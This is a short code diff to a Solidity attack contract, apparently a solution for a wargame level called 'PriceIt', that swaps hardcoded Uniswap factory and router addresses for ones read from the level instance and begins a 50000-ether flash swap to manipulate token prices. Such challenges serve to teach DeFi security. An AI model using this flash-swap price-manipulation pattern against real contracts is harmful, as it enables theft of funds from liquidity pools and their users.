@@ -4,13 +4,15 @@ pragma solidity ^0.8.0;
 import '../levels/PriceIt.sol';
 
 contract PriceItAttack {
-  IUniswapV2Factory private constant uniFactory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
-  IUniswapV2Router01 private constant uniRouter = IUniswapV2Router01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+  IUniswapV2Factory private uniFactory;
+  IUniswapV2Router01 private uniRouter;
 
   function doYourThing(PriceIt instance) external {
     IERC20 token0 = instance.token0();
     IERC20 token1 = instance.token1();
     IERC20 token2 = instance.token2();
+    uniFactory = instance.uniFactory();
+    uniRouter = instance.uniRouter();
     IUniswapV2Pair token0Token2Pair = IUniswapV2Pair(uniFactory.getPair(address(token0), address(token2)));
     uint256 flashSwapAmount = 50000 ether;
     bytes memory data = abi.encode(token0, token1, token0Token2Pair, flashSwapAmount, instance, msg.sender);
